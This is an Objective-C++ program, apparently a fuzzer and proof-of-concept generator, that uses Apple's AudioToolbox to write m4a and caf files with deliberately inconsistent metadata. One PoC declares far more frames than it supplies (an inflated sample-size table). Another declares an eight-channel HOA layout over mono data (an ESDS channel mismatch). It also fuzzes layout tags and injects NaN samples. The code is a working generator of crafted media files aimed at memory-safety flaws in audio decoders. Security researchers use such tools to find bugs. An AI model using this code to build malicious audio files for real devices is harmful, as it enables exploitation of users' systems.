@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>
#include <stdio.h>
#include <time.h>
#include <algorithm> // For std::min
#include <cmath>     // For NAN

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

// Original OverrideApac for general fuzzing
void OverrideApac(CodecConfig* config, uint32_t baseChannelNum) {
  if (config->remappingChannelLayout) {
    // Ensure created layout actually has descriptions to modify if tag implies it
    if (config->remappingChannelLayout->mChannelLayoutTag == kAudioChannelLayoutTag_UseChannelDescriptions ||
        (config->remappingChannelLayout->mChannelLayoutTag & 0xFFFF0000) == (kAudioChannelLayoutTag_HOA_ACN_SN3D & 0xFFFF0000) ) {
         uint32_t numDescriptionsToFuzz = config->remappingChannelLayout->mNumberChannelDescriptions > 0 ? config->remappingChannelLayout->mNumberChannelDescriptions : baseChannelNum;
         config->remappingChannelLayout->mChannelLayoutTag = (kAudioChannelLayoutTag_HOA_ACN_SN3D & 0xFFFF0000) | (rand() % (numDescriptionsToFuzz + 1)); // Fuzz channel count in tag
         fprintf(stderr, "OverrideApac: Fuzzed channel layout tag to 0x%x\n", (unsigned int)config->remappingChannelLayout->mChannelLayoutTag);
    }
  }
  config->mRemappingArray.resize(512 + (rand() % 512), (char)0xff);
}

// Helper function to set up the specific 8-channel HOA layout for PoC 2
void SetupChannelLayoutForPoC2_AAC(CodecConfig* config, uint32_t numChannelsForHOA) {
    size_t layoutSize = offsetof(AudioChannelLayout, mChannelDescriptions) + numChannelsForHOA * sizeof(AudioChannelDescription);
    if (config->remappingChannelLayout) {
        free(config->remappingChannelLayout);
    }
    config->remappingChannelLayout = (AudioChannelLayout*)calloc(1, layoutSize);
    if (!config->remappingChannelLayout) {
        fprintf(stderr, "PoC2 AAC: Failed to allocate memory for HOA channel layout\n");
        return;
    }
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | numChannelsForHOA;
    config->remappingChannelLayout->mNumberChannelDescriptions = numChannelsForHOA;

    for (uint32_t i = 0; i < numChannelsForHOA; ++i) {
        AudioChannelLabel label = kAudioChannelLabel_Unknown;
        // Attempt to assign valid ACN labels if within standard range
        if ((kAudioChannelLabel_HOA_ACN_0 + i) <= kAudioChannelLabel_HOA_ACN_Last) {
             label = kAudioChannelLabel_HOA_ACN_0 + i;
        }
        config->remappingChannelLayout->mChannelDescriptions[i].mChannelLabel = label;
        config->remappingChannelLayout->mChannelDescriptions[i].mChannelFlags = 0;
        config->remappingChannelLayout->mChannelDescriptions[i].mCoordinates[0] = 0;
        config->remappingChannelLayout->mChannelDescriptions[i].mCoordinates[1] = 0;
        config->remappingChannelLayout->mChannelDescriptions[i].mCoordinates[2] = 0;
    }
    fprintf(stderr, "PoC2 AAC: Set remappingChannelLayout to HOA with %u channels, tag 0x%X\n",
            (unsigned int)numChannelsForHOA, (unsigned int)config->remappingChannelLayout->mChannelLayoutTag);
    
    // mRemappingArray is not the primary focus of PoC 2 for esds, but can be fuzzed too.
    config->mRemappingArray.resize(512 + (rand() % 512), (char)0xAB); // Different fill for PoC2
}


int main() {
  time_t currentTime_start = time(nullptr);
  fprintf(stderr, "Starting encodeme at %s", ctime(&currentTime_start));

  std::vector<double> sampleRates = {44100, 48000}; // Reduced for quicker testing
  std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> formatDist(0, (int)formats.size() - 1);
  std::uniform_int_distribution<> pocChoiceDist(0, 1); // 0 for PoC1, 1 for PoC2 when AAC

  for (double sampleRate : sampleRates) {
    AudioFormatID formatID = formats[formatDist(gen)];
    int pocChoice = pocChoiceDist(gen); // Decide which PoC to apply if AAC

    fprintf(stderr, "--------------------------------------------------------\n");
    fprintf(stderr, "Processing sample rate %.0f, format ID %u (%s)\n",
            sampleRate, (unsigned int)formatID, (formatID == kAudioFormatMPEG4AAC ? "MPEG4AAC" : "LinearPCM"));
    if (formatID == kAudioFormatMPEG4AAC) {
        fprintf(stderr, "AAC PoC Choice: %d (0=InflatedSTSZ, 1=ESDSChannelMismatch)\n", pocChoice);
    }


    if (formatID == kAudioFormatMPEG4AAC && sampleRate < 8000) {
      fprintf(stderr, "Skipping potentially unsupported sample rate %.0f for AAC\n", sampleRate);
      continue;
    }

    // This initial channelNum is for general setup, may be overridden by PoCs for client data.
    uint32_t baseChannelNumForSetup = 1 + (rand() % 2); // 1 or 2 channels for simpler base
    fprintf(stderr, "Base setup channel count: %u\n", (unsigned int)baseChannelNumForSetup);

    AVAudioFormat* defaultFormatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:baseChannelNumForSetup];
    if (!defaultFormatIn) {
      fprintf(stderr, "Failed to create default AVAudioFormat for rate %.0f, channels %u\n", sampleRate, (unsigned int)baseChannelNumForSetup);
      continue;
    }

    AudioStreamBasicDescription outputDescription = {0};
    outputDescription.mSampleRate = sampleRate;
    outputDescription.mFormatID = formatID;
    // mChannelsPerFrame will be set by PoC2 logic if active, otherwise uses baseChannelNumForSetup
    outputDescription.mChannelsPerFrame = (formatID == kAudioFormatMPEG4AAC && pocChoice == 1) ? 8 : baseChannelNumForSetup;


    if (formatID == kAudioFormatLinearPCM) {
      outputDescription.mFormatFlags = kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked;
      outputDescription.mBitsPerChannel = 32;
      outputDescription.mBytesPerPacket = 4 * outputDescription.mChannelsPerFrame;
      outputDescription.mBytesPerFrame = 4 * outputDescription.mChannelsPerFrame;
      outputDescription.mFramesPerPacket = 1;
    } else if (formatID == kAudioFormatMPEG4AAC) {
      outputDescription.mFramesPerPacket = 1024;
    }

    CodecConfig config; // Will hold the channel layout for ExtAudioFileCreateWithURL

    if (formatID == kAudioFormatMPEG4AAC && pocChoice == 1) {
        // PoC 2: Setup 8-channel HOA layout for output file creation
        SetupChannelLayoutForPoC2_AAC(&config, 8); // 8 is declaredChannelsForOutput
    } else {
        // Default or PoC 1 layout handling: Use a simpler layout, maybe fuzzed by original OverrideApac
        AudioChannelLayoutTag defaultLayoutTag = (baseChannelNumForSetup == 1) ? kAudioChannelLayoutTag_Mono : kAudioChannelLayoutTag_Stereo;
        AVAudioChannelLayout* tempLayoutObj = [[AVAudioChannelLayout alloc] initWithLayoutTag:defaultLayoutTag];
        if (tempLayoutObj && tempLayoutObj.layout) {
            size_t tempLayoutSize = offsetof(AudioChannelLayout, mChannelDescriptions) + tempLayoutObj.channelCount * sizeof(AudioChannelDescription);
             if (tempLayoutObj.layout->mChannelLayoutTag != kAudioChannelLayoutTag_UseChannelDescriptions) {
                tempLayoutSize = offsetof(AudioChannelLayout, mChannelDescriptions);
            }
            config.remappingChannelLayout = (AudioChannelLayout*)calloc(1, tempLayoutSize + (rand()%5 * sizeof(AudioChannelDescription)) ); // Add some fuzz
            if(config.remappingChannelLayout) {
                memcpy(config.remappingChannelLayout, tempLayoutObj.layout, tempLayoutSize);
                // Original OverrideApac can fuzz this further if desired
                // OverrideApac(&config, baseChannelNumForSetup);
            }
        }
        if (!config.remappingChannelLayout) {
             fprintf(stderr, "Failed to setup default/PoC1 channel layout for config.\n");
             continue;
        }
    }
    
    NSString* fileExtension = (formatID == kAudioFormatMPEG4AAC) ? @"m4a" : @"caf";
    NSString* fileName = [NSString stringWithFormat:@"output_%.0f_fmt%u_poc%d.%@", sampleRate, (unsigned int)formatID, (formatID == kAudioFormatMPEG4AAC ? pocChoice : -1), fileExtension];
    NSURL* outUrl = [NSURL fileURLWithPath:fileName];
    fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

    ExtAudioFileRef audioFile = nullptr;
    OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl,
                                                (formatID == kAudioFormatMPEG4AAC) ? kAudioFileM4AType : kAudioFileCAFType,
                                                &outputDescription, // Contains declared channel count (8 for PoC2 AAC)
                                                config.remappingChannelLayout, // Contains layout (8-ch HOA for PoC2 AAC)
                                                kAudioFileFlags_EraseFile,
                                                &audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error creating file (rate %.0f, format %u): %d (0x%x)\n", sampleRate, (unsigned int)formatID, (int)status, (unsigned int)status);
      continue;
    }

    // Client Data Format Setup (describes the PCM data we *provide* to ExtAudioFileWrite)
    uint32_t clientDataChannels = baseChannelNumForSetup; // Default
    if (formatID == kAudioFormatMPEG4AAC && pocChoice == 1) { // PoC 2 provides MONO data
        clientDataChannels = 1;
    }
    AVAudioFormat* clientFormat = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:clientDataChannels];
    if (!clientFormat) {
        fprintf(stderr, "Failed to create client AVAudioFormat.\n");
        ExtAudioFileDispose(audioFile);
        continue;
    }
    AudioStreamBasicDescription clientASBD = *clientFormat.streamDescription;
    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), &clientASBD);
    if (status != noErr) {
      fprintf(stderr, "Error setting client data format: %d\n", (int)status);
      ExtAudioFileDispose(audioFile);
      continue;
    }

    AVAudioChannelLayout* clientLayoutObject = [[AVAudioChannelLayout alloc] initWithLayoutTag: (clientDataChannels == 1) ? kAudioChannelLayoutTag_Mono : kAudioChannelLayoutTag_Stereo];
    if (clientLayoutObject && clientLayoutObject.layout) {
        size_t clientLayoutSize = offsetof(AudioChannelLayout, mChannelDescriptions);
        if (clientLayoutObject.layout->mChannelLayoutTag == kAudioChannelLayoutTag_UseChannelDescriptions) {
            clientLayoutSize += clientLayoutObject.channelCount * sizeof(AudioChannelDescription);
        }
         status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout, clientLayoutSize, clientLayoutObject.layout);
        if (status != noErr) {
          fprintf(stderr, "Error setting client channel layout: %d\n", (int)status);
          ExtAudioFileDispose(audioFile);
          continue;
        }
    } else {
        fprintf(stderr, "Failed to create client channel layout object.\n");
        ExtAudioFileDispose(audioFile);
        continue;
    }
    
    const UInt32 pcmFramesInBuffer = 44100;
    float* audioBuffer = new (std::nothrow) float[pcmFramesInBuffer * clientDataChannels]; // Allocate based on actual client channels
    if (!audioBuffer) {
      fprintf(stderr, "Failed to allocate audio buffer\n", sampleRate);
      ExtAudioFileDispose(audioFile);
      continue;
    }
    std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
    for (size_t i = 0; i < pcmFramesInBuffer * clientDataChannels; ++i) {
      audioBuffer[i] = dis(gen);
      if ((rand() % 100) < 5) audioBuffer[i] = NAN;
    }
    fprintf(stderr, "Filled audio buffer with %u PCM frames for %u client channel(s)\n", (unsigned int)pcmFramesInBuffer, (unsigned int)clientDataChannels);

    if (formatID == kAudioFormatMPEG4AAC) {
        if (pocChoice == 0) { // PoC 1: Inflated STSZ
            UInt32 actualPCMFramesInData = 1024; 
            UInt32 declaredPCMFramesForMetadata = 8192;
            if (pcmFramesInBuffer < actualPCMFramesInData) {
                 fprintf(stderr, "PoC1 Error: audioBuffer too small for actualPCMFramesInData.\n");
            } else {
                AudioBufferList poc1AudioBufferList = {0};
                poc1AudioBufferList.mNumberBuffers = 1;
                poc1AudioBufferList.mBuffers[0].mNumberChannels = clientDataChannels; // Should be baseChannelNumForSetup here
                poc1AudioBufferList.mBuffers[0].mDataByteSize = actualPCMFramesInData * clientDataChannels * sizeof(float);
                poc1AudioBufferList.mBuffers[0].mData = audioBuffer;
                fprintf(stderr, "PoC1 (AAC): Writing %u declared PCM frames with actual data for %u PCM frames (%u channels).\n",
                        (unsigned int)declaredPCMFramesForMetadata, (unsigned int)actualPCMFramesInData, (unsigned int)clientDataChannels);
                status = ExtAudioFileWrite(audioFile, declaredPCMFramesForMetadata, &poc1AudioBufferList);
            }
        } else { // pocChoice == 1, PoC 2: ESDS Channel Mismatch
            // Data is MONO (clientDataChannels = 1), file declared as 8 channels. Write all MONO frames.
            AudioBufferList poc2AudioBufferList = {0};
            poc2AudioBufferList.mNumberBuffers = 1;
            poc2AudioBufferList.mBuffers[0].mNumberChannels = clientDataChannels; // This is 1 for PoC2
            poc2AudioBufferList.mBuffers[0].mDataByteSize = pcmFramesInBuffer * clientDataChannels * sizeof(float);
            poc2AudioBufferList.mBuffers[0].mData = audioBuffer;
            fprintf(stderr, "PoC2 (AAC): Writing %u PCM frames of MONO data to file declared as %u channels.\n",
                    (unsigned int)pcmFramesInBuffer, (unsigned int)outputDescription.mChannelsPerFrame);
            status = ExtAudioFileWrite(audioFile, pcmFramesInBuffer, &poc2AudioBufferList);
        }
    } else { // Non-AAC (e.g., Linear PCM)
        AudioBufferList pcmAudioBufferList = {0};
        pcmAudioBufferList.mNumberBuffers = 1;
        pcmAudioBufferList.mBuffers[0].mNumberChannels = clientDataChannels; // = baseChannelNumForSetup
        pcmAudioBufferList.mBuffers[0].mDataByteSize = pcmFramesInBuffer * clientDataChannels * sizeof(float);
        pcmAudioBufferList.mBuffers[0].mData = audioBuffer;
        fprintf(stderr, "Non-AAC: Writing %u PCM frames for %u client channel(s).\n",
                (unsigned int)pcmFramesInBuffer, (unsigned int)clientDataChannels);
        status = ExtAudioFileWrite(audioFile, pcmFramesInBuffer, &pcmAudioBufferList);
    }

    if (status != noErr) {
      fprintf(stderr, "Error writing audio: %d\n", (int)status);
    }

    status = ExtAudioFileDispose(audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error disposing file: %d\n", (int)status);
    }

    delete[] audioBuffer;
    fprintf(stderr, "Completed processing for file: %s\n", fileName.UTF8String);
  }

  time_t currentTime_end = time(nullptr);
  fprintf(stderr, "encodeme completed at %s", ctime(&currentTime_end));
  return 0;
}
